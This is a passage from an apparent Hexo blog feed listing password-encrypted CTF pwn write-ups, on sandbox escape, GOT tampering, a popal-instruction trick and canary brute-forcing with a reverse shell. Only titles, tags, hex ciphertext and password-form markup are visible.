eaf53e4e03133b1fdcf87d91ce4d12519658929fb8d889429afb7a6776ecf07c8f58d38ce08a0030be16e9fda20fdbb50ecf57f060b08ac9019b0f324e965770581fed3e2a9a4977faec15ddc226d96cecbf358d0d307771e0f8579f892ffa91ed241a16064febaeffa039389f09405c79566f77463f5a55b318e338a024beb08e4dcd479720bfd70aacbf898263c29c324126b0b6c84f5adfa7e9b192aebc64836ba4679ca32dfeab6825f923155704c81ea6c0f589f7bf120f502bd869212779f9f20ff3e7bd5065b4c9b9e65885d0521b27001f2a9ac9e51ca247031cb58ad12f799493d7946782c68080bfe8142fee92cb443ed99300cb9fb1f9c9bb8ec6501a864fb323685d76e9678805b28e71e1c2a8713a7ee8508b119d385d3ac805f3737a2ffd52ad0ed26d9599f94d750e075f90713a1e26f22e34e664d9c8661f44349285cab22c9099ae128786fa5a2d29e32d5ffcb497e00b614c586d6ecebe8a7681b978f00f54109e3f2fff3f5e8935bb2b0c0f41b6435e758a407d1096597639a2113dfca8a311b07c048b1f9f393431e3b3fcb22e4b2e71c0b8b55ea63b1463c3d0c2213e9e57a6112c14fce353152b98a50fd0c1c7074cc0f6d5928c6221d6c2f0cc693ebbdcf3dcd6664d0bf4e0c9931ad87df7b0d1e41844ee80fa63f132d8441816492c1e7f3cd14d0a41d4a929b33c46cc6280fcdbcc46a2a01aed4b99ce2f5f4fcb4baa39d92be322e0edd83b178310fede8a8857350e10731c3d8a90742a3a03bed9c81f65a08fed5b77c0d80a642b74b19f139dbfe62624e11de1970ac75364c36a1e7c0d1de8b01970c455bf012694a67f2f0d05261dddd36aba753124b06b424fa0242b01f60c590e4e26959791d04d7ad533e88976f9f4d381c595862c49a451b8564bcf99f74665ba3cfb5f7dd3342d217f1979a3e921efdbe6560b98fb105d72552fe1e5db72c0dc43bee49cf30702d9480b03329bc8688c7899f51121713ff7f3877e39022867c9b07b5c746636af36274d4a166d438ceac5af7256ae605b6cc6aca457beae8d9b1831919e02181ce9abe445c523fc0a8cbaf3f293e51b90f876941a9844663f8e2dfd63d39ebdcda98f78a74847a35a56559bab3275b89c5b7a07eaf4e1f7be7678cc49fa874fb7156e515d6410e5c9ab464f4419d1fd811158537fb793e756a7a638b6d7c9b4f367edb0f3d922582bb06fbf219bb27a95b344bd501ce37d01feedde584df1d481f224dd3fdafdee5f89386d33e432e40fcc144f5261de56f3108445f692041df2eb5e3ac200a21f9d76c3df3da076522e457ac6e93306d005d15a97686b6415a8cf7f2e0891722c7e8861d437d408b4091472a32cb4f52895e849d488779e5e461c4aea282be52619a62eeea1899f1d17004f9e49027948e7fe444f67dd66c417c148e299064ec289440f60ca2250cc3c07b00abfa949b016f0e661fc68cd20437389bf676cb057c79fb4ae3ffc5a4411f46ab0959bf590e28755265c456ec222ad3b2fc8db0a710d1976e77c0734feecae02e3adf111216657d2a8a52388c232c0fb5149237e3956ff3529f537d40f7c7f4296b768fa27ee685b58f0929dd34888decb598d79a518204cabd2dc0a2636ac4ae12264f65b45e786640e7dc57d2f62f03e57ea3dc9f82e05912d7d5cdd9d9c1393a5d289bf02170923da5e4b6fbccccb9fbe325cc709c492a5bbf85ce151d3b663ab001119cc3b25eeb0daab2a07900da12cc4c563dba1013bf2a7e4d605914cb96028397ea9c709a726ff0541e328555d3f6efe24459ee5ff3a294b8ab33759705bbef16d4c1960674beb13dae5e5a5053b218a1d792ee218e765e5c760466876968c14dca33eca8d1c23fe96a8ed24dd12a2e734ef6b9c317851ef37d125cc3ca6b644ac1423dd88f66087c8f9be60c54722aa8322e87454ad4458f3e1e0af8e1b1615f71e009744b7092d2c385a7eabc67685697ef9cb365686b6886be8781ce93bdad90dd87538db21419ae6cde1da7f11de30ff17e4975470279f26c7322e21a74917d1bc2a8f99d1a96802fe8c9377879362edaf0e7e3640877fb4f12cc79b372c40f9f4796f5a71bd7261b8ebe031535bf4cf095e5412831aec6f35f0dffaa8b32a073598186ac7cd1efe000911cc785f22f1ddf1cee8fb0a2b2d6c8069a13c5e0d9e4ea5e1bc56ade72ba705f074c34c735b4eed834dd649c6531696a590ae635d8ec83c33f20e3a23de3fcc6c24b26469deb585fd981231df34e05f26ddb7a066d2cb706fc0dd4cae3c1cd43674f07f0d2f5539b6e6689924bd430a5ae4729daed862a08c60a01110e990278c52bd860804a55a8ce97770c5594d255ce65d8f68b900fc99722c7926a42c5b6aa86103ac1deb202</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>私房菜</category>
      </categories>
      <tags>
        <tag>沙箱逃逸</tag>
        <tag>篡改got表</tag>
        <tag>lab</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>关于popal指令的一道pwn</title>
    <url>/posts/8179f351.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ff3adee71b85943723c899262a19fd36058cc1c39010569820ec50dfce7c37f7">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a405d915f1c487decf1b6fba2119b16df0d59108d3e9eb2945b2c0081761412eaea7fbdfbedf9e83ce93341376d4aad854aa0c0280e8fe9d0f964595a297dbbe7f77de4630cb58d7daf7a5742904f9f97117b8b030340a5ad7bc62180226c93e6608d384c904d83797a9945ea2eecd236e0d764b0e5d945811dd1da9b9851b7a1ce63403909280629275979bdabd89ac777ad16ebabe73fe7db2127af52255d1e8b1049cc3aa0fd8ad8c9394ec2d53b55d07bea41ddf47604c80e14f6e7d249b554127a3e3083c68366e40050b7571cc40e9a301b3f3ac79c87881b4e1aa79d3712415cf5b3682e1d73222ed7884e744a8d79444846e4f9c9cb680eb4aec16e96820cb39cb955c9738cbef0e6565a5f0142bac1d37093d3b8ff101d13a99fe8739d3434782f8ae1342a2c35aaba4e158503a5337a5433064dcbe2d111c040d4d936cd24b98c834885937cdbf5b7b6cba9092db336ae467e21e8b8d8a954d4aa804b86f41ee490d2c14793efae105a228d1c037e1ce1d4084e3adf01aeb83d84e053031ceca79247dcbedf51921035670ff22db95038b1c89f4654e6eed166b5446b7eb26405d437e288e5f7503462d95f604fb195e60e87cdbb403759cda02ba2a4add51fb82a469ae9ec5453fa5caae23a4e0bd5082f59c9b2def5ac8db791fbae740433e5210d4f0d76d3d852fb38f02212b7231d15c36a14f09b96c172ea838cca82b2258bd44f38b9a5d3d9ae9fe7cf76c8816466dd3efb476bf21159c733a147379ddad5b1099cf2136011b8a2bb7b98e0057135cfb3354ffe493e30937f0b7b59d6883685892b10adba184e6ed27b94e6a69ba514a24df97b3f3d68f9d6f0dfc72a5a594db0206de9d724bc82bb11335d84251a8cf0311948ba465cd2719651286f4eee058ef56c383ee925e8da03817bd2e3cdd2a32d4bae2cfbbde5245c0fb8150ae4d6f6479fa027c406b67e5891529a4b329bc617790e8505696a0fa2726be20f4dbc3547d71664e2aace5874c4d604de561109a00d036ba6e949b67dba541b52209d2d078a9579d387a36acd4a8ce8b9c7bbcf35ff054ec751269bcdd55eda6f93eb36a62acba4e84ec11fc8f93d5abefd423aa3384e72a40730510b2d6af49601fe3c9f413852f2cadec2e198cc7408c58bddae15b863f42365c66903ed940ea396ebb26cd16cf49c9318aab9b252f2aabb264574af0a75f1e3b56e70a9fb513b1891fa83a6d3e09bcfa20a4ed789b7553e4363a00936640567155068924c36e370a13cb3f0ef78a5c8ddb97447c842e62ced7594b860206bb2de618d117b93b32a5bdcd82049b24bbfb4c493163b2840eb2a80670684c58a9090676a0ec6ad348bb54d037d0602fd61c1fe31cd79054363ecb63e010d75b13d1e609e0523b77945fb40029a85bb35d63955f3af522c9c95524dacf7681c61747668c85617a5b4059413c4a1ab035bd7f0625566c46369494738ae8af3975596b36c579c01dca332a63a0ee96a13d8e309174b2178cd42c067fda90ffe2ba35739712ef6d7242ecb8e8e1e0db5d869108e2d23ba9e41b1105a1760baa60582cd2e9b4b02a37cbcb14dc70afd00755d1e35b81d99f1beb3ba0ba4884737db5405ab64fc8fd8882047d2a86d9b7608070e1956f8adba7a6d89987d44803fda84caf45f94554a52ece740c5d67841acee8532c772a761a47f42e0a777cea3d23823d2bc6a71ba0b5032709b5be9c1c4dc720a7dd2f424b1967890e2c6d6670aba0eca93ae3302c6d20b47995c1119cc2077d2fa05eeae799d3920c78650e0682559911facd79dacf18e902f210870aa6714aac97cfadf6249a8ddfb84c37cc7619cc3e52cc5e7eb2a6a6973ffef4d6f3596d75ee8a374e37e2269365b9d61a860454335ec6ad8c642bf145f753a82e1dc94843947e347f60001a434d2640297de7fe631c3f7d3a6a5a532654a25eb36d261dfa83e52f6c532d12fc2f409f6c546cadb43542c92ebaa6e3f23304192a28ea75348f7ccb10634edd2460a67c99514a0886fcf648b026479f2e81c9ee78de8e522866264d4ce40a1c74d8106a3cafaa93865c16e5de36115db642d974039dd85eeb035a4695ed234b76a5f39bdaeeb28cc5d6334422a70e963a72504d1858a4cc5e2209b8db77a222bd13348e6130e673d8c40c89c39315322e4f7a74e94c4345fa269c0773ad69804a935e5ea6b5b713ec635d1626340f89af238aa82a0955ebcfab0faf840143eb1c438b21402e6f9cb22e2ae4af2580d11f9d7dcd74684003b16fe9480df31de2daebc2182807fef9c0a8675acec61760c31bb197bcb58f2d77b7e02dbe02bc5121a9b4e2ce2aed120ef7ccaadeb0caa3022d13bf6e61bab121a5724ccffde582cd00ee751afd79f38d70bf4648d0567d5f83c6ff080b6b1b641f4f9feb599131e5d664ec414e911e4436b7ca088af751161113349558e36cc1476aa229afa52548c124f197f4e55642a472476bb0fab833f3bcf0eaeb5eca99d4e316fa33e7ce3f61d6883c198fc1ef77212e2adadf9522cd6ae6dde21ad5431e479c57f79531f032d0a82fe19514de105ed6fc2ea1602807371f25f58e447f1dfa7d727a6a3a7ed8183dfbb55f6ee7e5d335873795367ca2f1c4d3f2f3f0d366915a36ac75220ce84abd753db2b72db929ea28d1b5bd1355feb94aef559a605d922cb4d0da397b3519d1f16af7d23bb67d316efc751cb1f47dbc4e3ac6b24cae2ca64ef435dc1a5790cc6104d3cd97f9ac11fcec20780773162a42ff94b6e1d6ea1373c50c9bd9f2115dd5031c81e1c2b8ebe78402d0687c44ba2aaff1da0433ea22668f410a5df8f3290202f7cc915f1ee40711edcd5b84e3efcd95434257f3baa59cce5aec52df994773e759b40eda56fa1d30fb5a71d3afb8690f603d1f54ccf094dd53d171b5011514c9a383cade343cb97c10c838f8786450ce1054fb0a9bed6afa49a45530b753b8c2a148fc810bf504a5a88db53f0237ea07132605ff6813b53f2f3904191d69cc40b3da0c77e28a22c3f07ff8122e6dee0a823a0066df3fa769a00c2624424f46b91d187c25b5b31cb41bcdd3b07a69e0756773153734924bbfe36bb7b1201639750115b57e3573eb3f2a9748e0f1b60abaa562c48f3c73b5d7a3ba15a9a61b724e8783f9f6f157d816fe9ca59c5168d4db04314b00677b0f0bb811e9a089bc52c1b84cbd4d2c2f26f590161471e720dccb6fd14dad00e98019884d5a2ab05e9442d29dbf4e47d9af5c055a74b4109f4114191ef8d720e877a7a7109f817debeeee5ee2c4541e27bf84779db44f79ac181de42b56c1696a475019c34ad65d65b5778383f595f114a0d9d76cdb8575f09c668be760816637b90533bbe62db5e86749f54deaa43e2345c26f1b92f16665164bf59befbafc190ddfecb03bb99a204437c95e134fa7a9fb77c2e96ac9e7c136a91a3b874554728c17cc30421699477d07c03b2f599be30a56c45c590bc9ea5b356b62192e4c647639e368ab3e58c58b52185c2eaab57d37030c327ca3489f0609fe060b34ae9f25852736e83ffe12eb5772900375abfccbd3cd0af9501481e3c0c4053063558630cf4b6b91d8384bc7f9683c59333b52d714c0c9557f3d43c5be3910ae4aaecbf2ef9f514ad141d627b8bc6e1e310c68f3a7e40618214c4bc09d0229eef85d836bb2938488ef7ae8ecdd53cf5a7ba9ac6cf1b812fcf28aa0a4a15f449fb3f46d1734ffb0184e12217cfd9ec010d54fa056bf3ef1d4335d1586b81d2c1e74dfa7022fe08e6a2d29ad58353a09b23d0307860b79af629cf1478e7553ad339e00475c0f33140d0a187a8b141697e5fc0a825c5df5d4e12753dbd0016d6b17e62a8660e8424e896bad2feda53d4114010dcfaf3922627909504d0a26c69df45a5959687a7326fa755d0c5480fcf7f4caf6ff9dc0b11e701bec0410222046669245836947995c2c20eb79551035d2a328be15375b65fc514b6ac7eda49bbe8363a1bfa8c341c629db13955fd8a791d236e2c0d4351fa847455dd5d069ac8713b7feb57ad9643f7911ee977c3dec8d46c56cc66fcd7917670c987f06dd342301c736899d6f01b60421ed1dfcc19c034a6fddf118f0d59ca629f50c52fe5ca5982c21c6bd8486803dcbb76ae34798b9663046a6beca50aa201b3a80d4f6f8328d510ba110dd61802ae0631ce7fdf2a8faadde61430e0e1be7272aef0f3d03409694002d93aec39e226e89728fdf14adc1e19b8473eadcd8a2d836e5e8c8832865e8cd751d604d9a54e011d9b4001cc09d7b117ab78e0f7796247f003b558281cf376ba59e7d4956b15c7c852237ff03ba79c87f3b73818b7868adfd2591b10995b0a3b090e895285bf1cd426e1554bc35f304d8b0509c42d85eed15332384728e6642d0cf99566a3c5a322923ace7b8f99dd8021cfde2783d29c29220f6bba625ca37a629f6d7a6e3954a52fabcd67c18f2dea8b049e9b91cb2e24de566e97dde87e9943ca7dea26b2d6b56bb19bd53fe30a68492e257117b64cff986b7ffaaba656af4dac2cafd01803bdb9984e5ba516ccbdfc956d209689828d1073cde46b2cefd5e107cf9221438a5ab620cef84d0726ea4a3a2769899da49186ca3c1a37de57016ac1da5fd61884f67af3ef202df5de4af1b940cfb039554928b58478ef87e0d13ed4c31c05d174ba6a09339a737c507aa12f90f8503b18448f52f45d431e4ac7c15186b4c21bf8993ec7fa12e28ce5176bdb26a3fdbd7117f85887daeb10550cc518ebdfe3d38a63be876de6475b8c50809f39ef658f25bf055f2a1e5cae1cc6454c75a104369cadaec9b8e618d60d8eae9d93e4be36eedb925b0db8a5c99b6a31048c33407a927af88de7e5f66459aa47ec5ac1308d1067937a9c8849f57fd4eeddd56152c42b8230c88ab3c0cacbea598def5749528064ab0a6e1c8677aa0d86921bc029b941e9463d2652fb6754929e800e2e00128ff3470f6eed671395244bf78052f8b7381be55d46fac8eda4ad68fb9e55c37afbdb0be827bd8ac65465fcc389926be61154b4a01838879b15cc61fa8c41ccc764eaa9a2374a89aaaea92740cf3a63a5d234603b16b62c23c01d78282f1e5d1e6dec1aa76c5b7678acd3f5cc4903c093bac7f06c7eab9a06b028f250e600f7e02cf251613cd7bf27b24652c11fa226f0346fbf0786048b416b557c35e6c90d66ac592bc3ab6e5956a72913c05ccf7350c85586c6cc5b0e3b5b677bf9c1ad6e2e702afd784dd9c411f1f8947626b7e219bfc62e2796e2b4c2ff0bf05614fe6cf21ec204d08e9026a80a34b587c52b9eb41bbf8da2f01307b5df81a13abcf684eedfcdbc42fa6e113abb7c9abdff9eba8b8644963fe7f19de648cd51ca672a21cfc36c399316029ec3e4ea67dbb7896e3475d238a7ca0521a4fd8d2c5b9d75d00c1dbf24b045583807019c39afe3110a77bdad428d199a07b278647b6080383c3d56de24310594d9261ac62f2d9e5568d724f5db1cc8d2507c31019f79b8a4abe29cadb9d955cf82344e6c13389ab49f93771c7f0645cc93d1b7e3e33a17e49bb2ddc50246c909868d126a4cf506e6ae8fcde77434c63e7e807b3fc97f71570256195b2bbbfe936b7e2d79b3e3ec59287f4044311eaa0b0f36478843551b902c982b3508d3a504e0a283eb2903464daaf28d4d3ba915c1beca12b3fd48e33f3e6ec91786260b8ee94f11c4de9e91ea5355605fbd938e983c55563c22f9bab24f67cbec51a69e57678561f02fcedef540ca25449d892e2eaddae1bf05470fc1bedd1244fac47999729d88cb3bafb690bc81b2b64f2ac5c3b6c53bfad783a2792b4f221ab55660d057e9b790622cf757d78ddc64969b7096b8a8adefc0e62793c59fbafc4833fbb6576ef2f05649e142ec6be0dfda42caa9c225e53d244ccb55ca9caae305cd511e2310f681befbbdc5cb7c717a02616cf4bbf14f10c25f9aed7314fd6eaf796f05ff2d6c91a20f9f05abfaa26e98ff4280fa149a0aa3c32ee06157fd0d4b678258f2d6b99326aa87a1d7d7f88dad1ad6af28f9541846d469eb19599fc038b14627d5eb552039abffe7b9300d7fc189e13c61eb209d7c7b05a60f7efed4bc0bf83bfc6219eed061696fa2a249e0f2216fa1521d1e30f05b1e2fe60b7128804df234246c5833cc4d1ef96a3437cec788f99c63f19928e7bbe8a90e1c43e061572b3d6dd64c130c46d3ca6ede796274644dfd2171efcb5a97d00a44280c1f57c7138baf3145b405b3ba63b763f9965c55da35e019b702ce1c6c077a5dda22a674ecb1140ceb8d17a17001e3c5db359ac2b614dd4153c3052456ab7878e706949e4c1e41d96a20882adab036ee9957909bb5987408e1a76993c2ce892091a45b5ec6233d7c04e1cdd89e3a656320b3246877a19971bc353fd1d424ed236457cb1654417e7ccbb41b8c6fff19d051b750a61f1f65d7265255f2ffd921737edce6d558627e904e7e7d30effa6fe27f4c1234fa98b53dde39122e087d8a4f210d42d2493ab445d05906a696097fecc214c797aa72be1ac6c270a8a00685e8de646ca3c32e9ba4b6b79a827bbfe61eb4ea1d30851359670f87d12d9f6b6af7024acd269a35098c3cf30d0e9323d0e917b4af7a3110eecabbf043c821a9bd6d1d6af359a38a764f31b45a57a3794f3456f984e819f2bec85d705ae24e21cc090738b150ceee16c4b8b1b93edfcf489b616b745481603332e36e37289f636b2d45364ac7077002fe1f77b507c42bdac4cf0108cab96d9d49871ea7ca244d85b344a47d5eba9ae9898bbb64b0d750b79ab348f75529779d20638bb02cf10531ee08fa29dc19ae269db539b5626e12493482112d1d4c0b1e4f313f2998a64f7735c6d885f32ff7bb13406736cf17c2d1cbf77373575eb947bbaf1bc1929893fa9c754a7e8e9469d15d89b8f4660852f2f9a59d2fd3ebcca67e10af15e2c861d9b78ef3bc44298f1e16b1484fcb69cbd502cbf8d00953d0d3f24ff51e082112e1973f61f2f0af977ab9e59807b1ab5fc030d44985eb516eff09b9d03ebff566e0389e06f977244b244720c5f5749b04a81c6b039bb546a3408ca8f3ea3d6c36921bd2c28429799b94c699d77d9945b9820c1cf5315a7b45d2af03dc0a6cfa024e6dfac2aec025bab252a8080bd0ffb6e425cfad01fd3e67d187ee8414c8a887d611996e92e458992d46abaf6268cdc37f428be6124b1ac3b46b6b810f8241185f885402c6b47fcf95f96198b1f70fb9cd9014a3aed2360a84a0f521bc504034ac33927f95788ba8b2e56b2c25e344f28ea51b0bbe08d2fa98ff13402384788c5b563d6290e312a860322e658be9391de58669070b7252dbf94b5f78d3c4e047b7f5f1deebc1cc6c7bd8c44359944231259519d70e53e329434dbdaf1991bfbfef63bbbfc7f424f70237728107c3a4571e2e6fda94072ee3a555269b89d7a2017b2a933eeb57288e53815d02aabaffc0a1b5900a2f93f998a8d4083cc9e3d33a39f150e9b86b63ce710458fca245ec9582c655b9f37811c664747b236902ed6cb9d006200c40dedadb302d8c97d1ea7a5133bf682fd3ff18057123604c701aac1ac4475ed476c24839d5397414eaf57937cb8cbfde119aaab96649c4f011beb9ea78e12049388fea646bd2dbc213ace06d571ba6da097d6dfa6cf7c603ebc41dc7557c066bdc8915afcc78376f51158f7646a6b94fdeb771d04f09b83b3e63946463ecb253ab0f2b673e3d45ba597571506a1bc9fbaab035ae8377995972583096db493c5fc51689c32bfc4a26769d858af2e27584ab8fb605f56be8a0b2ebea0242473b32fb89b288c97fe610b08e668db678940451c5718bea5211d769b112a892dab82839eeeb56f775d6c04367cd58c99454548a455693ce60c117cda92ae15af2b0a6bdface1911</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>私房菜</category>
      </categories>
      <tags>
        <tag>lab</tag>
        <tag>popal指令</tag>
        <tag>trick</tag>
      </tags>
  </entry>
  <entry>
    <title>爆破canary+反弹shell</title>
    <url>/posts/3eb93c75.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ae32ab8b1f336fee1166a08450219e356e49914ac300fc46037e6ecb37acd031">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a405d915f1c487decf1b6fba2119b16df0d59108d3e9eb2945b2c0081761412eaea7fbdfbedf9e83ce93341376d4aad854aa0c0280e8fe9d0f964595a297dbbe7f77de4630cb58d7daf7a5742904f9f9711b8a162ba87d3f063b7ebb5da4e33d2fc3721b225cbec195073ef03421efa581651d2d2722a926e4424be4ce32f7d4cb885e11845567d7e52f196ffc2d19a57c573a90ea1f4e7e88d3c9cc5ca8c13336384750f517f6bfc8d3f9bbd253dc37c6e097cdd3bd4abb7f33ff6f9082ed2f5f2e7d6bbdfcf76b32ad078dd6d15f799356e09f66016916818ee0cf416468cc02a0a772d490bb327909a4bd187a7f77e5a29161cf222f7733a3d4b4dffa6f72339007ea045fed24e871fec3a6c27a14ca406ad8c0da432438bc4ca874323cab76b824276865bc389bd73e143be5e7dcbdd301d6d108a748a9c681d170a3f66e013e8f1784138e84e105256bc5cdaa0e112de670f253cf7efe9b433a1f08b71ebeb0e079c6ab636fe7b736860aef4257bfd2ab233527823b378b7ae1fed1b9ede96b3261a3b3c8fa710ba6cc87662f6b91bed29c25454b1574dcf6d367b50542892ee6208e25ad249004130548c2fee37b5565358b89a7b5e5365e4839d871ca0c7a4fa8cfa82e8054a73561f378e31685f9ae92589d648f4ff0926069021966e149b436aedd66548af39e6d9b876ae15f94f7f1abe8ce4ae5aba65ab6d6346213594f02e5c5976e34e24df7567addc761b061e9b00a253899c9c6f8f504866c7cbd728ed4ea938b08acd478a4573a9e697b7214c9ae39779b59535af2ec59570ecffb0b0fe8a5a5f56f4520dda72adeeda6bc4abbfb467b4b33f8f6c694a98c8e301a1e39600c9ea1a92200aa367f5d018d32ac6538542e4a029e519e87f476fd4c0941be64edff4efc60622f2069b183a04e028deddf679ee908e504dcfdaf78622fa6841ff581728310a32d6ec6acaf0ef14c257666c7e7f93d894c796fef33e1843a00a5cf8f85113c723a77df685d6d592474916c3654ff65a03b64cb79c7e959d7a277a2e42884ea43d51126f9d3aa1d330bd1b63176590934cbecc4336a47503ccaae06bda86ff19f64e5525c23c5783327e12ea3ac6c6108ebdb7d746eca4913a000b88c17b8bd9a60e0fef06d649715aa149d6aa8000dd8c853dd41c45036a3b4b6ca0af870ee61e651b19177d66e457f6da4184457011a972bc5ba84128068b4487872d1267df9725b1f01a769e9125a14495fabbd2f64fc02a9daf05ddc97592d361fbc2e0ba9bba23aec1d5ac12b0036abb3f482edaa8300f505598fea31e6a12ccbf6da701116864c336438d8c407dbf3bc6ae10a47bbe360d34190cabbde392e6aa529357d03532f41b29b595e87d4a908a1c53a57d919e916138383af124ad004c941df1a8752d9568e3bd46e427d2c4d2fe6ca677163b98291e900600b7f816c1fe1b71ddd69e511f5bcc29127a984a42cb6547b2f4d3e207de609b6a7de79866ceb4d1f0afc83ab74b2b5bf04ef2c144ca8651083a258b5ade4ced7d4664ac4558fbfb3e5cf6741a4fc4e8f58ad8979ff9811590e50b01a60cc9e47c0e7e2980a5298a8e452cd6ed6c1a2f7119d8f60fb93699f2a3ea6e19b609e68fbe2b64a96bf6874dd2e498a53745a36a07e8aa63b831e236a0cecf482dda9a39d6bec04bba84410f7409e565b70b17a0f6553b787dc0de4d259f938ff10e16ea5bd423a3e0a3f8d8be8cdf2271de4ff3592f159245f4d132c32bd6d3744c1959f914c321dde5e402623b85df329800b4bef93fb70cf60842eba757d1935da4bebd25ce859a260d437aaf4eadc038c8d82485a8da5b9308a4a5e25d3335a1547694b2c5b3531e1d48ac097da18d2089797d6d2177e4a5fce6234f3e3b1bc3576c0895ff105a542b18fff069890d664ddd8c15a535e22749cd2593c64942793311ab88263ab7fa139d1b50b265b2ff80f7b3e15ceaf4581d20f868a38caaa237d457d2e6a5af9a5c2b2d3f70f9859d848941d0aa315d1997bf0af2c32c4e738c0c75ae8c6087bfba9291b3c7726f4011d74242d5d863682d14f35a0bf1e6e9635eb3f735a7ea5322784ea461f8881d21a4f4ade42cfe691a6396d71e68eea1152d989546da0aca80bc7347e434d623363d61005a6d0aa9979d8bf66f0d600611a0d79406464c28d0ea90e680da1a5bdfdc44810ccb8c061d4cac63126c9996f315f6d3498e8c10ea487d87f72f60a5a4108f77967111b62a25a218349d68e3dd3d078d64c5678dca57fb1f44b77c9655146b1588a88e06f59f3abab9f78f81a65c52808ce949c21f0d830606b2da267dcf955aec15bbce47313e39e5582515d7d308921864cbb2480f58c2d19b2922f3e09e5210a7266be4c48d2d7b090fb6e5c79ad747cb003d25e5541f2c151483cb4c82814a18b88c8857862db687848ddea4fc450f522ad8454ec536ebfeec13aa2e4f3d1c3a0503e3ebd6253c1a22fc695818cd1be75548f42e4f45998ccc0ea1bdd08e7c66649e6ea769fe429a32e7adcec49af473d8c9893632c517158c37beac694e65b2307d3802209252d5c1576d7c5183cb863872a18c25f6770f520d320cb9077f600871275b86440dcb259f9c5d0ec0f6f45a441bddf65edf8b4971a4e6151dff2256ec4ad6e859f03016d3e941e00f5b4b2001b0f3ebed16ad03d463bd157d1a87cbe61a22f2d6a62ae57c1c1e8fe30014251d1e63f4023390924143073ff06435b35188733e37b417da4916a0f46aa528c00802c26ddc6976d48ca5bda1d4ed04fda78fcc2c2f4b30c35a10693a994a81a93a48c088b7ba43a3d442b63023ce882a330338b030ae7b97c5f87625cbf1b7d7f0359a48d41a08e8b14b12a370535726556a99584659a3d264612b14149c7cef1c61764f97dcfed04d7c76cfc826d97f1ffff0750b300734adc63d2f5f08611f70f1ed7ca98d26eda4c5bd0283cf6f3491c62a3c5fdf1dc3022d3dcfbf5bd17e7bbbcf54b70ded38db487cdfa723a4d8a4a9f0ac6efb7eaf2e47f36cd77d98f13dc54a1f5be003d97e1df3ec67294f548b2655879032c0218423ca886802f0e01d8bd4e23256dd71c4e0fa5ebc4706e33df6bbdeff8fc91447f5ccc8bc19249aa1c7d2facbc9a0ad1bb06b21d99311e3eb409aa047be6707ac3de62a790756c806ec6b3441662ed4f9dfd77b918643c301e0e59f3a44d6b8d1323ff96cc300d285883b74da2b95902a09c21a9a37bbbc8a110fe02823326b83091c68a1c40509e4912f547cf7a4a4d2a7a3804a4758686602c2422a596c00240e424ff6c167644be52f71c864906a89201bb8a72844dff78d8aa1a106e0ecd502f6effa2eec73a72a11fa99fdabfc827297ff6f6747593cfb203881957d7919f2964f6c064f0e40c6afe455d596684fa584cf6b6104d9929a204ec0b8ea9a82edb8ed194a59963714d4636c4898766e9c100c908b466c0ab12c7e338745c6dba6cfe37a99192e683c75ecf026097a6dbf3e7ba0c160ce57ae977706fce431d56def8fc1eb5d5b641aeadc40b8b069e44378155fdba7ab1b1ecf11f6c914031d23dc21c89f1ac88506174fa696890fdb5539fd04e39979498921dc3196e36eed5902fe9216b7167a0ac2716e700be2efb846ea2f69b6778e479a9a3c92022e0ae92b099d930c0848d27778baad46ee038941879a00c1c2cd6d130e3277f34aef78307ed634645fabc6b509d1fca9536b361260234f6f0357a45c714e2f5334978c177c53c658633e58a4af4e38430b138ffb1409eef9e3ba71710d56545f691b3e2a899ff4094187d23f109d2f276f2225dca00c728b90b6f27347f7f5d79fe3a19babde01c5ad20c1b86b20eb8e277138c78db1326eb5461cef59a31e3389547d61e4b78237b00c8f7447c3bad4693aae71a91b8f1b69b8c161e9b686b35dd61a2f98818bd5a4de82b5f4e7f91acace3efa7b134ce21167ce64bf1f73c819d3743eaaa661a869ab4a870917efc7ab03a0b0d7eeecf056fb542dc6212c5f783a912663f49e45d96c261e9a8194c1e9d615053805438a5b11647f10e86cd6ce80a88c07911d6d44f63c04a2ee6ea957a70c6969fedfa8e92b84fb32f309992ce03c95ff7d76a58143a980c157ff0d40e073cc1c19d8e0e5e6df0c2c5c03b569446b32e2f272df776abf5bee0253fbf65870ba48c431ce2cb4b69bbdd3e03fe2d2637b1e031f703fb5907f8b7067f2f885320ef1153975522b5d593898834be9d0a0670308ee46b728d87a43441859610427ed724a2f74b6f46ed930ff09c82765b268ec7fd446b17cc1c201ca186c3e79a1dac5b7f46c684f15740c628a5ffab91ffee4aeddb96a2ba80ecdce25ecaa93395c24d2298dda8fd292878c3660d56bbb1460d0a4b84bf3c738ec993e4da4f3bfa5c7c275647268da86fb9ff98fe22d6b337b643a1f66bc4b671c5d380a74c9aa570163f94f228d0d00835542a52efbf0eea85a5aeff8cba4199b98e20ff0b6b4245d6e9b9ee52ce452d41390f2b25628e2e4fd34999301c4e8110412dccae39f6bd92dd6af74ee0d671ac127edde970fd737d617c938eb89b0188d273a4b8955aad8733c9ff8a0270cc9e4a4ead6097934feb3d8207c0f2c837ab670efc284bec0091c4c53147c4bab6c947f6c3f25fdd58e9c70b6fa79ade372664cdf6a28152853389b3c289b7a7254e6473b0c8ac6d3bace05a532805f2cfa355e